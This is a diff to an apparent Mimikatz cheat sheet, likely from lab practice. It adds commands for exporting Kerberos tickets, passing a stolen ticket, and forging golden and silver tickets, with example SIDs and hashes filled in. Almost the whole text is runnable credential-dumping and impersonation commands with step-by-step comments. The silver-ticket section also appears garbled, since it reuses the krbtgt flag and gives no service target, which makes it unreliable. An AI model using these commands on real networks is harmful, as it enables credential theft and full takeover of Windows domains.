@@ -25,6 +25,9 @@ log customlogfilename.log
 ;; this will dump system hashes
 lsadump::lsa /patch
 
+# Dump Tickets
+sekurlsa::tickets /export
+
 # Extract plaintext passwords
 sekurlsa::logonpasswords
 
@@ -40,15 +43,43 @@ Invoke-Mimikatz -DumpCreds -ComputerName @("sys1", "sys2")
 # Overpass the hash 
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:mychild1.myforest.local /html:<ntlmhash> /run:powershell.exe"'
 
+# Pass an exported ticket
+privilege::debug
+sekurlsa::tickets /export
+;; run this command the ticket that you harvested. It will cache and impersonate the given ticket.
+kerberos::ptt <ticketfilename>
+
+# List the active ticket(s)
+;; outside of the mimikatz shell just type:
+klist
+
 # Create a Golden Ticket
 privilege::debug
-lsadump::lsa /inject /name:krbtgt   ;; This dumps the hash and security identifier of the 
+lsadump::lsa /inject /name:krbtgt
+;; This dumps the hash and security identifier of the 
 ;; Kerberos Ticket Granting Ticket account allowing you to create a golden ticket
 ;; in the next command we have to insert the data shown in the lsadump::lsa /inject command
 kerberos::golden /user:Administrator /domain:<domain.local> /sid:<shownInPreviousCommandFirstLine> /krbtgt:<shownInPreviousCommandUnderPrimaryNTLM> /id:500
+;; as an example:
+kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
 
 ;; once we have a golden ticket we can open a shell to access all machines in the domain with:
 misc::cmd
 ;; now try:
 dir \\Name-Of-Machine\C$
 ;; it will show the content of the specified machine
+
+
+# Create a Silver Ticket
+privilege::debug
+lsadump::lsa /inject /name:<servicename>
+;; This dumps the hash and security identifier of the 
+;; service account allowing you to create a silver ticket
+;; in the next command we have to insert the data shown in the lsadump::lsa /inject command
+;; the id here is 1103 instead of 500 (as for the golden ticket)
+kerberos::golden /user:Administrator /domain:<domain.local> /sid:<shownInPreviousCommandFirstLine> /krbtgt:<shownInPreviousCommandUnderPrimaryNTLM> /id:1103
+;; as an example:
+kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:cd40c9ed96265531b21fc5b1dafcfb0a /id:1103
+;; here the /user iirc is the user for which we are creating the ticket
+
+;; once we have a silver ticket we can interact with that specific service.
